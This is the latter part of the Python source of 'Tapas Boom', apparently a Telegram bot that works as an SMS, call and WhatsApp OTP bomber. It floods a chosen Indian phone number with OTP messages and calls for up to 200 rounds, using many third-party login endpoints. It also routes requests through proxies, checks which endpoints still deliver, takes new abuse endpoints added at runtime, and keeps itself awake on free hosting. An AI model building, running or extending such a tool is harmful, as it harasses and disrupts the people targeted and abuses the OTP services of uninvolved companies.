                async with proxy_sess.request(method, url, json=json_, **kw) as r:
                    body = await r.text(errors="ignore")
                    if _ok(r.status, body, identifier):
                        return f"✅ {name} (proxy)"
                    else:
                        mark_proxy_bad(proxy)
        except Exception:
            mark_proxy_bad(proxy)
    # Fallback to direct
    return await _call(sess, api, target)


# ════════════════════════════════════════════════════════════
# SELF-PING (keep Render/Railway free tier awake)
# ════════════════════════════════════════════════════════════

def _self_ping():
    while True:
        time.sleep(25 * 60)
        if not PING_URL:
            continue
        try:
            urllib.request.urlopen(PING_URL, timeout=10)
            logger.info("💓 self-ping OK")
        except Exception:
            pass

# ════════════════════════════════════════════════════════════
# BOT COMMANDS
# ════════════════════════════════════════════════════════════

async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    total = len(SMS_APIS) + len(CALL_APIS) + len(WA_APIS)
    kb = InlineKeyboardMarkup([
        [
            InlineKeyboardButton("📖 Help", callback_data="help"),
            InlineKeyboardButton("📊 Status", callback_data="status"),
        ],
        [
            InlineKeyboardButton("➕ Add API", callback_data="addapi"),
        ],
    ])
    await update.message.reply_text(
        f"🔥 *Tapas Boom v4.3 — Direct*\n\n"

        f"📩 SMS APIs : `{len(SMS_APIS)}`\n"
        f"📞 Call APIs: `{len(CALL_APIS)}`\n"
        f"💬 WA APIs  : `{len(WA_APIS)}`\n"
        f"⚡ Total    : `{total}`\n\n"
        f"USA server se direct Indian numbers pe OTP!\n"
        f"Koi proxy nahi, koi key nahi — seedha fire!\n\n"
        f"Number bhejo ya `/blast 9876543210 10` karo",
        parse_mode="Markdown",
        reply_markup=kb,
    )


async def cmd_help(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    txt = (
        "📖 *Tapas Boom v4.2 — Commands*\n\n"
        "*🔥 Blast:*\n"
        "`/blast 9876543210` — 10 rounds (default)\n"
        "`/blast 9876543210 50` — 50 rounds\n"
        "`/sms 9876543210` — sirf SMS\n"
        "`/call 9876543210` — sirf Call OTP\n"
        "`/wa 9876543210` — sirf WhatsApp OTP\n\n"
        "*🔍 Debug (OTP nahi aa raha? Yeh use karo!):*\n"
        "`/debug 9876543210` — har API ka actual HTTP response dikho\n"
        "`/test 9876543210 Swiggy` — ek specific API test karo\n\n"
        "*📊 Info:*\n"
        "`/status` — API count + health\n"
        "`/stats` — failure stats\n"
        "`/recover` — health cache reset\n\n"
        "Ya bas number type karo — auto fire hoga!\n\n"
        "_Tip: /debug se pata karo kaun si APIs actually deliver karti hain_ 👆"
    )
    await update.message.reply_text(txt, parse_mode="Markdown")


async def cmd_status(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    total = len(SMS_APIS) + len(CALL_APIS) + len(WA_APIS)
    with _api_health_lock:
        skipped = sum(
            1 for h in _api_health.values()
            if h["fails"] >= _API_SKIP_THRESHOLD
               and time.monotonic() - h["last_fail"] < _API_RECOVER_AFTER
        )
        total_ok = sum(h.get("ok", 0) for h in _api_health.values())
    await update.message.reply_text(
        f"📊 *Bot Status*\n\n"
        f"📩 SMS: `{len(SMS_APIS)}` APIs\n"
        f"📞 Call: `{len(CALL_APIS)}` APIs\n"
        f"💬 WA: `{len(WA_APIS)}` APIs\n"
        f"⚡ Total: `{total}` APIs\n"
        f"🔴 Cooldown: `{skipped}` APIs\n"
        f"✅ All-time OK: `{total_ok}`\n\n"
        f"_Proxy-free mode — direct USA→India_",
        parse_mode="Markdown",
    )


async def cmd_stats(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    with _api_health_lock:
        data = sorted(_api_health.items(), key=lambda x: x[1]["fails"], reverse=True)
    if not data:
        await update.message.reply_text("No stats yet — blast karo pehle!")
        return
    lines = ["📈 *API Stats (top failures)*\n"]
    for name, h in data[:15]:
        lines.append(f"`{name}` — ✅{h['ok']} ❌{h['fails']}")
    await update.message.reply_text("\n".join(lines), parse_mode="Markdown")


async def cmd_recover(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    with _api_health_lock:
        _api_health.clear()
    await update.message.reply_text(
        "♻️ *Health cache reset!*\nSab APIs fresh start karenge.",
        parse_mode="Markdown",
    )


async def cmd_debug(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """/debug 9876543210 — har API ka actual response body dikho"""
    args = ctx.args or []
    if not args:
        await update.message.reply_text(
            "❗ Usage: `/debug 9876543210`\n\nYeh command har SMS API ko ek baar fire karti hai aur actual response dikhati hai.\n"
            "Isse pata chalega kaun si API actually deliver kar rahi hai.",
            parse_mode="Markdown",
        )
        return
    mobile = _parse_mobile(args[0])
    if not mobile:
        await update.message.reply_text("❗ 10-digit number do (e.g. 9876543210)")
        return

    # Only test SMS APIs in debug mode (not call/wa to keep output short)
    apis_to_test = SMS_APIS[:15]  # first 15 only to avoid message flood
    await update.message.reply_text(
        f"🔍 *Debug Mode* — `+91{mobile}`\n"
        f"Testing top {len(apis_to_test)} SMS APIs one by one...\n"
        f"_(Actual HTTP status + response snippet dikhega)_",
        parse_mode="Markdown",
    )

    results_text = []
    for api in apis_to_test:
        res = await _call_debug(api, mobile)
        status = res["status"]
        ok_mark = "✅" if res["ok"] else "❌"
        body_preview = res["body"].replace("`", "'")[:200]
        results_text.append(
            f"{ok_mark} *{res['name']}* | HTTP `{status}`\n"
            f"```\n{body_preview}\n```"
        )

    # Send in chunks of 5 (Telegram message size limit)
    for i in range(0, len(results_text), 5):
        chunk = "\n\n".join(results_text[i:i+5])
        try:
            await update.message.reply_text(chunk, parse_mode="Markdown")
        except Exception:
            # If markdown fails, send plain
            plain = chunk.replace("*", "").replace("`", "").replace("```", "")
            await update.message.reply_text(plain[:4000])


async def cmd_test(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """/test 9876543210 Swiggy — ek specific API test karo"""
    args = ctx.args or []
    if len(args) < 2:
        all_names = [a["name"] for a in SMS_APIS + CALL_APIS + WA_APIS]
        sample = ", ".join(all_names[:8])
        await update.message.reply_text(
            f"❗ Usage: `/test 9876543210 Swiggy`\n\nAvailable APIs (sample): `{sample}`, ...",
            parse_mode="Markdown",
        )
        return
    mobile = _parse_mobile(args[0])
    if not mobile:
        await update.message.reply_text("❗ 10-digit number do")
        return
    api_name = " ".join(args[1:]).strip()
    all_apis = SMS_APIS + CALL_APIS + WA_APIS
    found = next((a for a in all_apis if a["name"].lower() == api_name.lower()), None)
    if not found:
        close = [a["name"] for a in all_apis if api_name.lower() in a["name"].lower()][:5]
        hint = f"\nClose matches: `{', '.join(close)}`" if close else ""
        await update.message.reply_text(
            f"❗ API `{api_name}` nahi mili.{hint}\n\n`/debug` use karo sab dekhne ke liye.",
            parse_mode="Markdown",
        )
        return

    await update.message.reply_text(
        f"🔍 Testing *{found['name']}* on `+91{mobile}`...",
        parse_mode="Markdown",
    )
    res = await _call_debug(found, mobile)
    ok_mark = "✅ Delivered (API ne accept kiya)" if res["ok"] else "❌ Failed / Not delivered"
    body_preview = res["body"].replace("`", "'")[:500]
    await update.message.reply_text(
        f"*{found['name']}* result:\n"
        f"Status: `{res['status']}`\n"
        f"Result: {ok_mark}\n\n"
        f"*Raw response:*\n```\n{body_preview}\n```",
        parse_mode="Markdown",
    )


# ════════════════════════════════════════════════════════════
# BLAST COMMANDS
# ════════════════════════════════════════════════════════════

def _parse_mobile(text: str) -> str:
    digits = "".join(c for c in text if c.isdigit())
    if digits.startswith("91") and len(digits) == 12:
        digits = digits[2:]
    return digits if len(digits) == 10 else ""


def _done_kb(mobile: str, mode: str, rounds: int) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([[
        InlineKeyboardButton("🔁 Again", callback_data=f"again_{mobile}_{mode}_{rounds}"),
        InlineKeyboardButton("🔴 Double", callback_data=f"again_{mobile}_{mode}_{min(rounds*2,200)}"),
    ]])


async def _do_fire(update_or_query, mobile: str, mode: str, rounds: int, is_query: bool = False):
    """Start blast as background task with STOP button."""
    if is_query:
        user_id = update_or_query.from_user.id
    else:
        user_id = update_or_query.message.from_user.id

    mode_labels = {"sms": "📩 SMS", "call": "📞 Call", "wa": "💬 WA", "all": "🚀 All"}
    label      = mode_labels.get(mode, mode.upper())
    total_apis = {
        "sms": len(SMS_APIS), "call": len(CALL_APIS),
        "wa": len(WA_APIS), "all": len(SMS_APIS) + len(CALL_APIS) + len(WA_APIS)
    }.get(mode, 0)

    stop_kb = InlineKeyboardMarkup([[
        InlineKeyboardButton("🛑 STOP", callback_data=f"stop_{user_id}")
    ]])

    fire_text = (
        f"🔥 *Firing!* `+91{mobile}`\n"
        f"Mode: {label} | Rounds: *{rounds}*\n"
        f"~{total_apis * rounds} total requests\n"
        f"⏳ Chal raha hai... _(rok ne ke liye 🛑 dabao)_"
    )
    if is_query:
        msg = await update_or_query.edit_message_text(
            fire_text, parse_mode="Markdown", reply_markup=stop_kb
        )
    else:
        msg = await update_or_query.message.reply_text(
            fire_text, parse_mode="Markdown", reply_markup=stop_kb
        )

    async def _fire_task():
        try:
            ok, total, _ = await run_blast(mobile, rounds, mode)
            rate = int(ok / total * 100) if total else 0
            done_text = (
                f"✅ *Done!* `+91{mobile}`\n"
                f"{label} | *{rounds}* rounds\n"
                f"📊 *{ok}/{total}* APIs responded ({rate}%)"
            )
            await msg.edit_text(
                done_text, parse_mode="Markdown",
                reply_markup=_done_kb(mobile, mode, rounds)
            )
        except asyncio.CancelledError:
            try:
                await msg.edit_text(
                    f"🛑 *Ruk gaya!* `+91{mobile}`\n{label} — aapne rok diya ✋",
                    parse_mode="Markdown",
                    reply_markup=_done_kb(mobile, mode, rounds),
                )
            except Exception:
                pass
        except Exception as e:
            logger.error("_fire_task error uid=%s: %s", user_id, e)
        finally:
            _user_tasks.pop(user_id, None)

    old = _user_tasks.get(user_id)
    if old and not old.done():
        old.cancel()

    loop = asyncio.get_event_loop()
    task = loop.create_task(_fire_task())
    _user_tasks[user_id] = task


async def cmd_blast(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """/blast 9876543210 [rounds]"""
    args = ctx.args or []
    if not args:
        await update.message.reply_text(
            "❗ Usage: `/blast 9876543210 20`\n_(rounds default=10, max=200)_",
            parse_mode="Markdown",
        )
        return
    mobile = _parse_mobile(args[0])
    if not mobile:
        await update.message.reply_text("❗ 10-digit number do (e.g. 9876543210)")
        return
    rounds = min(int(args[1]) if len(args) > 1 and args[1].isdigit() else 10, 200)
    await _do_fire(update, mobile, "all", rounds, is_query=False)


async def cmd_sms(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """/sms 9876543210 [rounds]"""
    args = ctx.args or []
    if not args:
        await update.message.reply_text("❗ Usage: `/sms 9876543210 10`", parse_mode="Markdown")
        return
    mobile = _parse_mobile(args[0])
    if not mobile:
        await update.message.reply_text("❗ 10-digit number do")
        return
    rounds = min(int(args[1]) if len(args) > 1 and args[1].isdigit() else 5, 200)
    await _do_fire(update, mobile, "sms", rounds, is_query=False)


async def cmd_call(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """/call 9876543210 [rounds]"""
    args = ctx.args or []
    if not args:
        await update.message.reply_text("❗ Usage: `/call 9876543210 10`", parse_mode="Markdown")
        return
    mobile = _parse_mobile(args[0])
    if not mobile:
        await update.message.reply_text("❗ 10-digit number do")
        return
    rounds = min(int(args[1]) if len(args) > 1 and args[1].isdigit() else 5, 200)
    await _do_fire(update, mobile, "call", rounds, is_query=False)


async def cmd_wa(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """/wa 9876543210 [rounds]"""
    args = ctx.args or []
    if not args:
        await update.message.reply_text("❗ Usage: `/wa 9876543210 10`", parse_mode="Markdown")
        return
    mobile = _parse_mobile(args[0])
    if not mobile:
        await update.message.reply_text("❗ 10-digit number do")
        return
    rounds = min(int(args[1]) if len(args) > 1 and args[1].isdigit() else 5, 200)
    await _do_fire(update, mobile, "wa", rounds, is_query=False)


# ════════════════════════════════════════════════════════════
# MESSAGE HANDLER — bare number send karo, auto blast
# ════════════════════════════════════════════════════════════

async def handle_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    # ➕ /addapi followup — accepts JSON object / array / JSONL / URL list
    if _ADD_WAIT.pop(update.effective_user.id, False):
        try:
            specs = _parse_api_payload(update.message.text or "")
            added, failed = _register_bulk(specs)
            await update.message.reply_text(
                f"✅ Added `{len(added)}` API(s) (failed: `{failed}`). "
                f"Total SMS APIs: `{len(SMS_APIS)}`\n"
                f"_Tip: bade list ke liye `.txt` / `.json` file bhi DM me bhej sakte ho._",
                parse_mode="Markdown",
            )
        except Exception as e:
            await update.message.reply_text(f"❌ Parse failed: `{e}`", parse_mode="Markdown")
        return
    text = (update.message.text or "").strip()
    mobile = _parse_mobile(text)
    if not mobile:
        await update.message.reply_text(
            "❓ 10-digit number bhejo ya command use karo.\n`/help` dekho.",
            parse_mode="Markdown",
        )
        return

    kb = InlineKeyboardMarkup([
        [
            InlineKeyboardButton("🚀 All (SMS+Call+WA)", callback_data=f"fire_{mobile}_all_10"),
        ],
        [
            InlineKeyboardButton("📩 SMS Only", callback_data=f"fire_{mobile}_sms_5"),
            InlineKeyboardButton("📞 Call Only", callback_data=f"fire_{mobile}_call_5"),
        ],
        [
            InlineKeyboardButton("💬 WA Only",  callback_data=f"fire_{mobile}_wa_5"),
            InlineKeyboardButton("🔥 50 Rounds", callback_data=f"fire_{mobile}_all_50"),
        ],
    ])
    await update.message.reply_text(
        f"📱 `+91{mobile}` — kaise fire karein?",
        parse_mode="Markdown",
        reply_markup=kb,
    )


# ════════════════════════════════════════════════════════════
# BUTTON HANDLER
# ════════════════════════════════════════════════════════════

async def handle_button(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q    = update.callback_query
    data = q.data or ""
    await q.answer()

    # STOP button
    if data.startswith("stop_"):
        uid = int(data.split("_", 1)[1])
        task = _user_tasks.get(uid)
        if task and not task.done():
            task.cancel()
            await q.edit_message_text("🛑 Ruk raha hoon...")
        else:
            await q.answer("Already stopped!", show_alert=True)
        return

    # Fire button: fire_{mobile}_{mode}_{rounds}
    if data.startswith("fire_"):
        parts = data.split("_", 4)
        if len(parts) >= 4:
            _, mobile, mode, rounds_s = parts[0], parts[1], parts[2], parts[3]
            rounds = min(int(rounds_s) if rounds_s.isdigit() else 10, 200)
            await _do_fire(q, mobile, mode, rounds, is_query=True)
        return

    # Again / Double button: again_{mobile}_{mode}_{rounds}
    if data.startswith("again_"):
        parts = data.split("_", 4)
        if len(parts) >= 4:
            _, mobile, mode, rounds_s = parts[0], parts[1], parts[2], parts[3]
            rounds = min(int(rounds_s) if rounds_s.isdigit() else 10, 200)
            await _do_fire(q, mobile, mode, rounds, is_query=True)
        return

    # Inline help / status
    if data == "addapi":
        _ADD_WAIT[q.from_user.id] = True
        await q.edit_message_text(
            "➕ *Add API (custom)*\n\n"
            "Ek JSON bhejo, ye format me:\n\n"
            "`{\"name\":\"MyApi\",\"url\":\"https://x.com/otp\",\"json\":{\"mobile\":\"+91{target}\"}}`\n\n"
            "Ya `/addapi <json>` command use karo.\n"
            "Add hone ke baad SMS blast me automatic use hogi.",
            parse_mode="Markdown",
        )
        return
    if data == "help":
        await q.edit_message_text(
            "📖 *Commands*\n\n"
            "`/blast 9876543210 10`\n`/sms /call /wa`\n`/status /stats /recover`\n\n"
            "Ya bas number type karo!",
            parse_mode="Markdown",
        )
    elif data == "status":
        total = len(SMS_APIS) + len(CALL_APIS) + len(WA_APIS)
        await q.edit_message_text(
            f"📊 *Status*\n\n"
            f"Total APIs: `{total}`\n"
            f"SMS: `{len(SMS_APIS)}` | Call: `{len(CALL_APIS)}` | WA: `{len(WA_APIS)}`\n\n"
            f"_Proxy-free — direct USA→India_",
            parse_mode="Markdown",
        )





# ════════════════════════════════════════════════════════════
# /addapi — user adds custom OTP endpoint at runtime
# ════════════════════════════════════════════════════════════

async def cmd_addapi(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    raw = " ".join(ctx.args) if ctx.args else ""
    if not raw:
        _ADD_WAIT[update.effective_user.id] = True
        await update.message.reply_text(
            "➕ *Add API(s)*\n\n"
            "Agli message me kuch bhi bhejo:\n"
            "• Ek JSON object\n"
            "• JSON array `[ {..}, {..} ]`\n"
            "• Ya seedha `.txt` / `.json` *file* DM me — har line pe JSON ya URL.\n\n"
            "Example line: `{\"name\":\"MyApi\",\"url\":\"https://x.com/otp\",\"json\":{\"mobile\":\"+91{target}\"}}`",
            parse_mode="Markdown",
        )
        return
    try:
        specs = _parse_api_payload(raw)
        added, failed = _register_bulk(specs)
        await update.message.reply_text(
            f"✅ Added `{len(added)}` API(s) (failed: `{failed}`). "
            f"Total SMS APIs: `{len(SMS_APIS)}`",
            parse_mode="Markdown",
        )
    except Exception as e:
        await update.message.reply_text(f"❌ Parse failed: `{e}`", parse_mode="Markdown")


# ════════════════════════════════════════════════════════════
# DOCUMENT HANDLER — DM me .txt / .json file bhejo, saari APIs add
# ════════════════════════════════════════════════════════════

async def handle_document(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message
    if not msg or not msg.document:
        return
    doc = msg.document
    fname = (doc.file_name or "file").lower()
    if not (fname.endswith(".txt") or fname.endswith(".json")
            or fname.endswith(".jsonl") or fname.endswith(".list")
            or (doc.mime_type or "").startswith("text/")):
        await msg.reply_text(
            "❗ Sirf `.txt` / `.json` / `.jsonl` file support hai.",
            parse_mode="Markdown",
        )
        return
    if doc.file_size and doc.file_size > 2 * 1024 * 1024:
        await msg.reply_text("❗ File 2MB se choti honi chahiye.")
        return
    try:
        tg_file = await doc.get_file()
        buf = await tg_file.download_as_bytearray()
        raw = bytes(buf).decode("utf-8", errors="replace")
        specs = _parse_api_payload(raw)
        added, failed = _register_bulk(specs)
        _ADD_WAIT.pop(update.effective_user.id, None)
        preview = ", ".join(added[:5]) + (" …" if len(added) > 5 else "")
        await msg.reply_text(
            f"✅ File se `{len(added)}` API(s) add hui (failed: `{failed}`).\n"
            f"Total SMS APIs: `{len(SMS_APIS)}`\n"
            f"{('Added: `' + preview + '`') if added else ''}",
            parse_mode="Markdown",
        )
    except Exception as e:
        await msg.reply_text(f"❌ File parse failed: `{e}`", parse_mode="Markdown")

# ════════════════════════════════════════════════════════════
# HEALTH SERVER  (Heroku web dyno ko $PORT bind karna zaroori hai,
# warna R10 "Boot timeout" aakar app crash ho jaata hai)
# ════════════════════════════════════════════════════════════

def _start_health_server():
    from http.server import BaseHTTPRequestHandler, HTTPServer

    class _Health(BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.send_header("Content-Type", "text/plain; charset=utf-8")
            self.end_headers()
            self.wfile.write(b"Tapas Boom bot is running")

        def do_HEAD(self):
            self.send_response(200)
            self.end_headers()

        def log_message(self, *args):
            pass

    def _serve():
        try:
            HTTPServer(("0.0.0.0", PORT), _Health).serve_forever()
        except Exception as exc:
            logger.warning("Health server band: %s", exc)

    threading.Thread(target=_serve, daemon=True).start()
    logger.info("Health server listening on port %d", PORT)


# ════════════════════════════════════════════════════════════
# MAIN
# ════════════════════════════════════════════════════════════

def main():
    global _SEM
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    _SEM = asyncio.Semaphore(300)

    # Heroku web dyno: $PORT bind karo warna R10 crash
    _start_health_server()

    # Self-ping thread (keep alive on free hosting)
    threading.Thread(target=_self_ping, daemon=True).start()

    from telegram.request import HTTPXRequest
    req = HTTPXRequest(
        connect_timeout=60.0,
        read_timeout=60.0,
        write_timeout=60.0,
        pool_timeout=60.0,
    )
    app = Application.builder().token(TELEGRAM_BOT_TOKEN).request(req).build()
    app.add_handler(CommandHandler("start",   cmd_start))
    app.add_handler(CommandHandler("help",    cmd_help))
    app.add_handler(CommandHandler("status",  cmd_status))
    app.add_handler(CommandHandler("stats",   cmd_stats))
    app.add_handler(CommandHandler("recover", cmd_recover))
    app.add_handler(CommandHandler("blast",   cmd_blast))
    app.add_handler(CommandHandler("sms",     cmd_sms))
    app.add_handler(CommandHandler("call",    cmd_call))
    app.add_handler(CommandHandler("wa",      cmd_wa))
    app.add_handler(CommandHandler("debug",   cmd_debug))   # NEW: actual response body
    app.add_handler(CommandHandler("test",    cmd_test))    # NEW: test one specific API
    app.add_handler(CommandHandler("addapi",  cmd_addapi))   # NEW: user-added APIs
    app.add_handler(CallbackQueryHandler(handle_button))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))   # NEW: file se bulk add

    total = len(SMS_APIS) + len(CALL_APIS) + len(WA_APIS)
    logger.info(
        "✅ Tapas Boom v4.0 CLEAN | SMS:%d Call:%d WA:%d Total:%d | No-Proxy Direct Mode",
        len(SMS_APIS), len(CALL_APIS), len(WA_APIS), total,
    )

    app.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True)


if __name__ == "__main__":
    main()
